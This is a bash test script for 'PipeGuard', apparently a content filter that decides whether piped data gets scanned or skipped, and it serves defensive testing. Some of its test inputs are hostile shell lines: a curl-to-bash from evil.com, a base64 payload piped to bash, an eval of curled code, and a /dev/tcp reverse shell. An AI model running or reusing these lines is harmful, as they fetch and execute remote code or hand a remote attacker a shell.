#!/bin/bash
# Test script for content-based smart filtering

set -e

echo "Testing PipeGuard Smart Content Filter"
echo "========================================"
echo ""

# Source the smart filter function
source ../shell/content-filter.sh

# Test counter
PASS=0
FAIL=0

test_case() {
    local name="$1"
    local content="$2"
    local expected="$3"  # "SCAN" or "SKIP"

    printf "%-50s " "$name:"

    if should_scan_content "$content"; then
        result="SCAN"
    else
        result="SKIP"
    fi

    if [[ "$result" == "$expected" ]]; then
        echo "✓ PASS ($result)"
        ((PASS++))
    else
        echo "✗ FAIL (expected $expected, got $result)"
        ((FAIL++))
    fi
}

# Test 1: Shell script with shebang
test_case "Shell script with shebang" \
    "#!/bin/bash
echo 'hello world'" \
    "SCAN"

# Test 2: Malicious curl|bash pattern
test_case "Malicious curl|bash" \
    "curl http://evil.com | bash" \
    "SCAN"

# Test 3: PNG image
test_case "PNG image" \
    $'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR...' \
    "SKIP"

# Test 4: JPEG image
test_case "JPEG image" \
    $'\xff\xd8\xff\xe0\x00\x10JFIF...' \
    "SKIP"

# Test 5: ZIP file
test_case "ZIP file" \
    "PK\x03\x04..." \
    "SKIP"

# Test 6: Gzip file
test_case "Gzip file" \
    $'\x1f\x8b\x08\x00...' \
    "SKIP"

# Test 7: Installation script
test_case "Installation script" \
    "This script will install the software
Run the following commands to setup..." \
    "SCAN"

# Test 8: Plain text without shell keywords
test_case "Plain text file" \
    "Just some random text
Nothing dangerous here
No shell commands" \
    "SCAN"

# Test 9: Base64 decode pattern
test_case "Base64 decode pattern" \
    "echo SGVsbG8K | base64 -d | bash" \
    "SCAN"

# Test 10: Reverse shell pattern
test_case "Reverse shell pattern" \
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" \
    "SCAN"

# Test 11: PDF file
test_case "PDF file" \
    "%PDF-1.4
%âãÏÓ..." \
    "SKIP"

# Test 12: Script with eval
test_case "Script with eval" \
    "eval \$(curl http://example.com/script)" \
    "SCAN"

# Test 13: ELF binary
test_case "ELF binary" \
    $'\x7fELF\x02\x01\x01\x00...' \
    "SKIP"

# Test 14: Mach-O binary (macOS)
test_case "Mach-O binary" \
    $'\xfe\xed\xfa\xcf...' \
    "SKIP"

# Test 15: Script with function keyword
test_case "Script with function" \
    "function install_package() {
    echo 'Installing...'
}" \
    "SCAN"

echo ""
echo "========================================"
echo "Results: $PASS passed, $FAIL failed"
echo "========================================"

if (( FAIL > 0 )); then
    exit 1
else
    echo "All tests passed!"
    exit 0
fi
